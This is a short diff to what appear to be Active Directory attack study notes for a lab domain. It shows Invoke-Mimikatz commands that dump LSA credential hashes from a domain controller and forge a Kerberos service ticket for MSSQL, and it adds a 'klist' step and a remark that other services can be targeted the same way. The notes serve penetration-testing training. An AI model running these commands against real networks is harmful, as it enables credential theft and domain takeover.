@@ -418,3 +418,5 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - Dump the RC4 hash
   - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DomainControllerPCName>`
   - `Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:<SID> /target:dcorp-dc-dollarcorp.moneycorp.local /service:MSSQLSvc /rc4:<RC4-Hash> /user:Administrator /ptt"'`
+  - `klist`
+  - Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS, WSMAN and many more
